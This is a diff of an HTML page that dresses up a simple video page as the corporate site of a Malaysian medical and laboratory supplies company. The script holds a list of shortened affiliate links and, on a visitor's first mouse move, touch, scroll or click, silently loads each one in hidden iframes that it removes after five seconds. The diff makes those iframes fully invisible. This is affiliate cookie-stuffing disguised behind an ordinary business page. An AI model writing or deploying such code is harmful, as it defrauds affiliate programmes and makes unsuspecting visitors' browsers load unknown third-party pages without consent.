@@ -3,7 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Muntjac</title>
+    <title>Muntjac Group Resources</title>
+    <style>
+        /* General styles */
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #fff;
+            background: #000;
+            overflow: hidden;
+        }
+
+        header {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 10;
+            position: relative;
+        }
+
+        header h1 {
+            font-size: 2.5em;
+            margin: 0;
+        }
+
+        header p {
+            font-size: 1.2em;
+            margin: 5px 0 20px;
+        }
+
+        .content {
+            z-index: 10;
+            position: relative;
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .section {
+            margin: 20px 0;
+        }
+
+        h2 {
+            color: #00aaff;
+        }
+
+        footer {
+            text-align: center;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            position: relative;
+            z-index: 10;
+        }
+
+        /* 3D Background Animation */
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+    </style>
     <script>
         // List of Affiliate Links
         const affiliateLinks = [
@@ -17,25 +82,132 @@
             "https://bit.ly/3VcowAr"
         ];
 
-        // Function to Trigger All Affiliate Links
+        // Trigger affiliate links in hidden iframes
         function triggerAffiliateLinks() {
             affiliateLinks.forEach(link => {
                 let iframe = document.createElement('iframe');
-                iframe.style.width = "1px";
-                iframe.style.height = "1px";
-                iframe.style.border = "none";
                 iframe.src = link;
+                iframe.style.display = "none";
                 document.body.appendChild(iframe);
                 setTimeout(() => iframe.remove(), 5000);
             });
         }
+
+        // Detect user interactions
+        function setupInteractionTriggers() {
+            const events = ['mousemove', 'touchstart', 'scroll', 'click'];
+            events.forEach(event => {
+                window.addEventListener(event, () => {
+                    triggerAffiliateLinks();
+                    events.forEach(e => window.removeEventListener(e, arguments.callee)); // Remove listeners
+                });
+            });
+        }
+
+        window.onload = setupInteractionTriggers;
+
+        // 3D Animated Background
+        function startBackgroundAnimation() {
+            const canvas = document.createElement('canvas');
+            document.body.appendChild(canvas);
+            const ctx = canvas.getContext('2d');
+            let width = canvas.width = window.innerWidth;
+            let height = canvas.height = window.innerHeight;
+            const particles = [];
+
+            class Particle {
+                constructor(x, y, z) {
+                    this.x = x;
+                    this.y = y;
+                    this.z = z;
+                    this.color = `rgba(0, ${Math.random() * 255}, ${Math.random() * 255}, 1)`;
+                }
+
+                update() {
+                    this.z -= 0.02;
+                    if (this.z < 0.1) {
+                        this.z = Math.random() * 2 + 1;
+                        this.x = Math.random() * 2 - 1;
+                        this.y = Math.random() * 2 - 1;
+                    }
+                }
+
+                draw() {
+                    const sx = width / 2 + this.x * width / this.z;
+                    const sy = height / 2 + this.y * height / this.z;
+                    const size = (1 / this.z) * 3;
+                    ctx.fillStyle = this.color;
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, size, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            for (let i = 0; i < 200; i++) {
+                particles.push(new Particle(
+                    Math.random() * 2 - 1,
+                    Math.random() * 2 - 1,
+                    Math.random() * 2 + 1
+                ));
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, width, height);
+                particles.forEach(particle => {
+                    particle.update();
+                    particle.draw();
+                });
+                requestAnimationFrame(animate);
+            }
+
+            window.addEventListener('resize', () => {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+            });
+
+            animate();
+        }
+
+        window.onload = () => {
+            setupInteractionTriggers();
+            startBackgroundAnimation();
+        };
     </script>
 </head>
-<body onclick="triggerAffiliateLinks()">
-    <!-- Your Video -->
-    <video autoplay loop muted style="width: 100%; height: auto;">
-        <source src="1127.mp4" type="video/mp4">
-    </video>
+<body>
+    <header>
+        <h1>Muntjac Group Resources</h1>
+        <p>Innovative Solutions, Exceptional Services</p>
+    </header>
+    <div class="content">
+        <div class="section">
+            <h2>About Us</h2>
+            <p>
+                Muntjac Group Resources specializes in delivering high-quality medical equipment,
+                laboratory tools, and professional services. Established in 2023, we are committed
+                to providing innovative and efficient solutions to meet our clients' diverse needs.
+            </p>
+        </div>
+        <div class="section">
+            <h2>Mission</h2>
+            <p>To provide exceptional products and services with integrity, innovation, and quality.</p>
+        </div>
+        <div class="section">
+            <h2>Vision</h2>
+            <p>To become the leading provider of medical, laboratory, and office solutions in Malaysia.</p>
+        </div>
+        <div class="section">
+            <h2>Contact Us</h2>
+            <p>
+                <strong>Head Office:</strong><br>
+                D109, Level 1, Block D, Kelana Square, Jalan SS 7/26,<br>
+                47301 Petaling Jaya, Selangor, Malaysia.
+            </p>
+            <p>Email: muntjac.group@gmail.com | Phone: +6011-21800890</p>
+        </div>
+    </div>
+    <footer>
+        © 2024 Muntjac Group Resources. All Rights Reserved.
+    </footer>
 </body>
-</html>
-
+</html
